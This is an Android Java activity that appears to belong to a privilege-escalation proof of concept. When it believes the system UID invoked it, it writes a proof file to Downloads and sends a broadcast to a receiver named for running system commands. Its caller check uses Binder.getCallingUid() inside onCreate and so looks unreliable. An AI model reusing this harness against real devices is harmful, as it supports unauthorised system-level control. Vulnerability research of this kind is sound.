package com.example.tzpoc;

import android.app.Activity;
import android.content.Intent;
import android.os.Binder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Process;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;

public class ProofActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int callerUid = Binder.getCallingUid();
        int myUid = Process.myUid();

        MainActivity.appendLog("[ProofActivity] called. callerUid=" + callerUid + ", myUid=" + myUid);

        // システム（uid=1000）からの呼び出しであることを確認
        if (callerUid == 1000) {
            MainActivity.appendLog("[!!!] ProofActivity called from system (uid=1000)");

            // 証跡ファイルに記録
            try {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!dir.exists()) dir.mkdirs();
                File proof = new File(dir, "proof_called_by_system.txt");
                try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                    pw.println("ProofActivity called by system (uid=1000)");
                    pw.println("Caller UID: " + callerUid);
                    pw.println("My UID: " + myUid);
                    pw.println("Timestamp: " + new java.util.Date());
                }
                MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
            } catch (Exception e) {
                MainActivity.appendLog("[-] Failed to create proof: " + e.getMessage());
            }

            // SystemCommandReceiver にブロードキャストを送信（これもシステム権限で実行される）
            Intent receiverIntent = new Intent(this, SystemCommandReceiver.class);
            sendBroadcast(receiverIntent);
            MainActivity.appendLog("[+] Broadcast sent to SystemCommandReceiver");

        } else {
            MainActivity.appendLog("[!] ProofActivity called by non-system uid: " + callerUid);
        }

        finish();
    }
}
